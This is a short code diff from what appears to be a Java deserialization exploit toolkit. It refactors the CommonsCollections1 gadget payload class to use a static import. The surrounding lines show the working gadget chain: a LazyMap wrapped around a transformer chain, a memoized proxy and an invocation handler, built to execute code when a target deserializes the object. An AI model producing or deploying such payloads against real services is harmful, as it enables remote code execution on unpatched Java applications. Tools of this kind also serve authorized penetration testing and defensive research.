@@ -14,6 +14,8 @@ import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
 import java.util.Map;
 
+import static com.qi4l.JYso.gadgets.utils.Utils.createMemoitizedProxy;
+
 /**
  * Gadget chain:
  * ObjectInputStream.readObject()
@@ -52,7 +54,7 @@ public class cc1 implements ObjectPayload<InvocationHandler> {
 
         final Map innerMap = new HashMap();
         final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-        final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
+        final Map mapProxy = createMemoitizedProxy(lazyMap, Map.class);
         final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
 
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers);// 反射修改iTransformers属性会触发反序列化
